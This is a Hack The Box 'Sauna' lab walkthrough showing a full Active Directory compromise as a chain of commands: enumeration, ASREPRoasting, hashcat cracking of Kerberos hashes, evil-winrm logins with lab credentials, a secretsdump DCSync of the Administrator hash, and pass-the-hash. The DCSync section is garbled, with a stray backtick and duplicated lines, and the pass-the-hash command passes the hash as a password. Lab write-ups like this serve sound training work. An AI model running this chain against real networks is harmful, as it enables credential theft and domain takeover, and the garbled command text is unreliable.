# Sauna Walkthrough

[![Hack The Box](https://img.shields.io/badge/HackTheBox-Sauna-green?logo=hackthebox)](https://app.hackthebox.com/machines/229)
[![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green)](https://github.com/subhash00/HTB_Labs/)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-blue)](https://github.com/subhash00/HTB_Labs/)
[![Topic: Active Directory](https://img.shields.io/badge/Topic-Active%20Directory-yellowgreen)](https://en.wikipedia.org/wiki/Active_Directory)

---

## Overview

This walkthrough explains the exploitation process for the Sauna HTB machine. The attack starts from service enumeration and information gathering, proceeds through username generation and Kerberos ASREPRoasting attacks, followed by password cracking, establishing remote access through WinRM, and privilege escalation via password discovery and Active Directory abuse. The final steps include using BloodHound for domain attack path visualization and performing DCSync & Pass-the-Hash attacks to achieve full domain compromise.

---

## Table of Contents

- [Enumeration & Service Discovery](#enumeration--service-discovery)
- [LDAP and User Enumeration](#ldap-and-user-enumeration)
- [SMB Enumeration](#smb-enumeration)
- [Web Enumeration](#web-enumeration)
- [Username Generation](#username-generation)
- [ASREPRoasting (Kerberos Attack)](#asreproasting-kerberos-attack)
- [Password Cracking](#password-cracking)
- [Remote Access via WinRM](#remote-access-via-winrm)
- [Privilege Escalation](#privilege-escalation)
- [Active Directory Attack Path Discovery](#active-directory-attack-path-discovery)
- [DCSync & Domain Admin Compromise](#dcsync--domain-admin-compromise)
- [Stepwise PoC](#stepwise-poc)
- [Tools Used](#tools-used)
- [Techniques](#techniques)

---

## Enumeration & Service Discovery
```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.95.180 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.95.180
```

- Opens all ports on the target machine and discovers the services running, saving the ports for detailed scanning with service and script detection enabled.

---

## LDAP and User Enumeration

- **Windapsearch:**

`./windapsearch.py -d egotistical-bank.local --dc-ip 10.129.95.180 -U`

- Performs LDAP queries to enumerate Active Directory users anonymously or with provided credentials.

- **Impacket GetADUsers:**

`impacket-GetADUsers egotistical-bank.local/ -dc-ip 10.129.95.180 -debug`

- Retrieves user information from the domain controller via LDAP.

---

## SMB Enumeration

- **List SMB Shares:**

`smbclient -L \\10.129.95.180 -N`

- Lists the SMB shares available on the target machine using anonymous access. The `-N` skips password authentication.

---

## Web Enumeration

- **Directory Fuzzing with ffuf:**

`ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.129.95.180/FUZZ`

- Brute-forces common web directories and files to discover hidden content or endpoints on the web server.

---

## Username Generation

- **Username Anarchy:**

`./username-anarchy --input-file names.txt --select-format first,flast,first.last,firstl > usernames.txt`

- Generates possible username permutations from employee full names to be used in further attacks.

---

## ASREPRoasting (Kerberos Attack)

- **Check accounts without preauthentication and extract hashes:**
```
while read p; do impacket-GetNPUsers egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.129.95.180 >> hash.txt; done < usernames.txt
```

- Iterates through usernames to identify accounts with Kerberos pre-authentication disabled and extracts AS-REP hashes.

---

## Password Cracking

- **Crack AS-REP hashes using hashcat:**

`hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force`

- Uses hashcat to brute-force the cracked Kerberos AS-REP hashes with the rockyou.txt wordlist. `--force` bypasses warnings or compatibility issues.

---

## Remote Access via WinRM

- **Login using Evil-WinRM:**

`evil-winrm -i 10.129.95.180 -u fsmith -p 'Thestrokes23'`

- Establishes a remote PowerShell session on the Windows box with the cracked user credentials.

---

## Privilege Escalation

- **Run WinPEAS to enumerate escalate vectors:**

`.\winPEAS.exe`

- Enumerates permissions, users, passwords, and configurations revealing the user `svc_loanmgr` and its password.

- **Query the svc_loanmgr user group:**

`net user svc_loanmgr | Select-String -Pattern "remote"`

- Checks group membership in particular for Remote Management permissions.

- **Login with svc_loanmgr:**

`evil-winrm -i 10.129.95.180 -u svc_loanmgr -p 'Moneymakestheworldgoround!'`

- Obtains a higher privileged session with discovered password.

---

## Active Directory Attack Path Discovery

- **Gather domain attack graph using BloodHound:**

`bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All --zip`

- Collects Active Directory information remotely for visualization of attack paths with BloodHound.

---

## DCSync & Domain Admin Compromise

- **Dump domain admin hash with secretsdump:**

`impacket-secretsdump egotistical-bank/svc_loanmgr@10.129.95.180 -just-dc-user Administrator`

- Uses DCSync privileges of svc_loanmgr to extract NTLM hashes of the domain administrator.

- **Pass the Hash attack to get SYSTEM shell:**

`
- Uses DCSync privileges of svc_loanmgr to extract NTLM hashes of the domain administrator.

- **Pass the Hash attack to get SYSTEM shell:**

`evil-winrm -i 10.129.95.180 -u administrator -p 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'`

- Connects to the machine remotely as SYSTEM using the stolen hash credentials.

---

## 11. Stepwise PoC

<details>
<summary>💻<strong>(click to expand)</strong> </summary>
  <img width="1615" height="834" alt="24" src="https://github.com/user-attachments/assets/5ebed4d1-0431-4f36-b75e-d60458aff937" />
<img width="1633" height="839" alt="23" src="https://github.com/user-attachments/assets/c4b595d5-71c6-49ed-ac98-c1d1b1a77b84" />
<img width="1000" height="360" alt="22" src="https://github.com/user-attachments/assets/762f683d-a45f-4443-8801-d93c00f6c0ea" />
<img width="1182" height="300" alt="21" src="https://github.com/user-attachments/assets/786e0ed9-832b-49e8-9695-9e59bfa65b97" />
<img width="1057" height="273" alt="20" src="https://github.com/user-attachments/assets/b3f9bebc-11c3-418e-a7f8-4f981340c43e" />
<img width="1920" height="799" alt="19" src="https://github.com/user-attachments/assets/ddf19694-68ee-480d-97a1-6bb2fe5f66d7" />
<img width="1172" height="768" alt="18" src="https://github.com/user-attachments/assets/19ae7f1f-ae92-4729-a855-364022b068ab" />
<img width="1844" height="795" alt="17" src="https://github.com/user-attachments/assets/0cb4f530-c9cb-498a-bcde-12df2274b408" />
<img width="763" height="240" alt="16" src="https://github.com/user-attachments/assets/72767fff-691e-4ed8-a714-9d2f988d8e29" />
<img width="1368" height="850" alt="15" src="https://github.com/user-attachments/assets/87749c4e-b718-4125-897a-0ed519c2e768" />
<img width="1917" height="754" alt="14" src="https://github.com/user-attachments/assets/b775e2b4-2334-4496-bc7e-74d6e28b59b4" />
<img width="1770" height="691" alt="13" src="https://github.com/user-attachments/assets/82a65523-cb02-49f4-a56b-9d5ba6ea0a7f" />
<img width="1897" height="181" alt="12" src="https://github.com/user-attachments/assets/4382c3a4-63d0-409e-bc81-dc42f5766795" />
<img width="1634" height="387" alt="11" src="https://github.com/user-attachments/assets/62e72194-45a2-41bd-859e-4798b759f70b" />
<img width="1914" height="719" alt="10" src="https://github.com/user-attachments/assets/ee7bb604-2f96-4042-951b-325543a2a74d" />
<img width="803" height="814" alt="9" src="https://github.com/user-attachments/assets/2c03d841-35fe-4400-b687-ae23305b1e00" />
<img width="1180" height="369" alt="8" src="https://github.com/user-attachments/assets/801c3a64-e867-493d-946f-b1eeefb35547" />
<img width="1529" height="571" alt="7" src="https://github.com/user-attachments/assets/11247860-f614-4eb1-b62d-896c7c9e2cb3" />
<img width="1409" height="674" alt="6" src="https://github.com/user-attachments/assets/f416df19-c4fe-4293-804f-ee01c486d2eb" />
<img width="1842" height="858" alt="5" src="https://github.com/user-attachments/assets/6470860d-be27-484a-ae55-348450420249" />
<img width="710" height="350" alt="4" src="https://github.com/user-attachments/assets/3317c1b3-de55-4b85-8497-9dce71ab9abb" />
<img width="1270" height="672" alt="3" src="https://github.com/user-attachments/assets/2311403c-6a72-4111-b956-f9daaa2cbf55" />
<img width="1278" height="382" alt="2" src="https://github.com/user-attachments/assets/2ebde1a6-558f-4869-a64b-e5a0727b7f55" />
<img width="1414" height="460" alt="1" src="https://github.com/user-attachments/assets/9a45efcc-b443-4be9-b72c-fd9fa265e201" />

</details>

---

## Tools Used

- **windapsearch.py:** LDAP enumeration and Active Directory user/group discovery.
- **impacket-GetADUsers:** User enumeration via LDAP protocol.
- **username-anarchy:** Username permutation generator for penetration testing.
- **impacket-GetNPUsers:** AS-REP Roasting attack tool to extract Kerberos hashes.
- **winPEAS.exe:** Windows privilege escalation enumeration tool.
- **secretsdump:** Dumps sensitive secrets from domain controllers using DCSync.
- **evil-winrm:** Tool for Windows Remote Management shell access.
- **bloodhound-python:** Active Directory attack path data collector.
- **hashcat:** Hash cracking tool for offline brute-force attacks.

---

## Techniques

- **ASREPRoasting:** Extraction and cracking of AS-REP Kerberos hashes for users without preauthentication enabled.
- **DCSync:** Abuse of replication rights to dump password hashes from domain controller’s NTDS.dit file.
- **Pass The Hash:** Using extracted NTLM hashes to authenticate and gain system-level access without cracking.

---


